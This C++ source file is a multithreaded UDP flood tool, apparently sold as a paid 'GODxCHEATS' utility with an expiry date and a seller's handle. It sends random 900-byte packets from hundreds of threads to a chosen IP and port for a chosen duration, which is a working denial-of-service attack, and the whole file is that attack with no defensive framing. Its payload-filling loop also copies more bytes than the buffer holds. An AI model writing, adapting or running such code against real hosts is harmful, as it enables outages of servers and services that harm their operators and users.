#include <iostream>
#include <string>
#include <vector>
#include <ctime>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <pthread.h>
#include <errno.h>

#define PAYLOAD_SIZE 900    
#define RANDOM_STRING_SIZE 999  
#define DEFAULT_THREAD_COUNT 900  
#define EXPIRY_DATE "2025-2-23"   

struct AttackParams {
    std::string ip;
    int port;
    int duration;
};

bool is_expired() {
    int expiry_year, expiry_month, expiry_day;
    sscanf(EXPIRY_DATE, "%d-%d-%d", &expiry_year, &expiry_month, &expiry_day);

    time_t now = time(nullptr);
    struct tm *current_time = localtime(&now);

    if (current_time->tm_year + 1900 > expiry_year ||
        (current_time->tm_year + 1900 == expiry_year && current_time->tm_mon + 1 > expiry_month) ||
        (current_time->tm_year + 1900 == expiry_year && current_time->tm_mon + 1 == expiry_month && current_time->tm_mday > expiry_day)) {
        return true; 
    }
    return false; 
}

void generate_random_string(std::string& buffer, size_t size) {
    const std::string charset = "abcdefghijklmnopqrstuvwxyz0123456789/";
    buffer.clear();
    for (size_t i = 0; i < size; ++i) {
        buffer += charset[rand() % charset.size()];
    }
}

void* send_udp_packets(void* arg) {
    AttackParams* params = reinterpret_cast<AttackParams*>(arg);
    int sock;
    struct sockaddr_in server_addr;
    char payload[PAYLOAD_SIZE];
    std::string random_string;

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(nullptr);
    }

    fcntl(sock, F_SETFL, O_NONBLOCK);

    int size = 1024 * 1024; 
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &size, sizeof(size));
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &size, sizeof(size));

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->port);
    if (inet_pton(AF_INET, params->ip.c_str(), &server_addr.sin_addr) <= 0) {
        perror("Invalid address/Address not supported");
        close(sock);
        pthread_exit(nullptr);
    }

    for (size_t i = 0; i < PAYLOAD_SIZE; i += RANDOM_STRING_SIZE) {
        generate_random_string(random_string, RANDOM_STRING_SIZE);
        strncpy(payload + i, random_string.c_str(), RANDOM_STRING_SIZE);
    }

    time_t start_time = time(nullptr);
    while (time(nullptr) - start_time < params->duration) {
        if (sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                usleep(100); 
            } else {
                perror("Send failed");
                break;
            }
        }
    }

    close(sock);
    pthread_exit(nullptr);
}

int main(int argc, char *argv[]) {

    if (strcmp(argv[0], "./broken") != 0) {
        std::cerr << "Error: use ./broken <ip> <port> <duration>\n";
        return 1;
    }

    if (is_expired()) {
        std::cerr << "file expired dm to buy owner @GODxAloneBOY.\n";
        return 1;
    }

    const std::string default_ip = "127.0.0.1";
    int default_port = 80;
    int default_time = 60;
    int default_threads = DEFAULT_THREAD_COUNT;

    AttackParams params;
    if (argc >= 2) {
        params.ip = argv[1];
    } else {
        params.ip = default_ip;
    }

    params.port = (argc >= 3) ? std::stoi(argv[2]) : default_port;
    params.duration = (argc >= 4) ? std::stoi(argv[3]) : default_time;
    int thread_count = (argc >= 5) ? std::stoi(argv[4]) : default_threads;

    if (thread_count <= 0) {
        std::cerr << "Invalid thread count. Using default: " << DEFAULT_THREAD_COUNT << std::endl;
        thread_count = DEFAULT_THREAD_COUNT;
    }

    std::cout << "Using values: IP = " << params.ip << ", Port = " << params.port 
              << ", Duration = " << params.duration << " seconds, Threads = " << thread_count << std::endl;

    srand(static_cast<unsigned int>(time(nullptr)));

    std::vector<pthread_t> threads(thread_count);
    for (int i = 0; i < thread_count; ++i) {
        if (pthread_create(&threads[i], nullptr, send_udp_packets, &params) != 0) {
            perror("Thread creation failed");
            return 1;
        }
    }

    // Wait for all threads to finish
    for (int i = 0; i < thread_count; ++i) {
        pthread_join(threads[i], nullptr);
    }

    std::cout << "*****************************************\n";
    std::cout << "*                                 *\n";
    std::cout << "*      ×͜×ㅤ𝙰𝙻𝙾𝙽𝙴ㅤ𝙱𝙾𝚈 ×͜×       *\n";
    std::cout << "*   ꧁༒GODxCHEATS༒꧂    *\n";
    std::cout << "*                                 *\n";
    std::cout << "******************************************\n";
    return 0;
}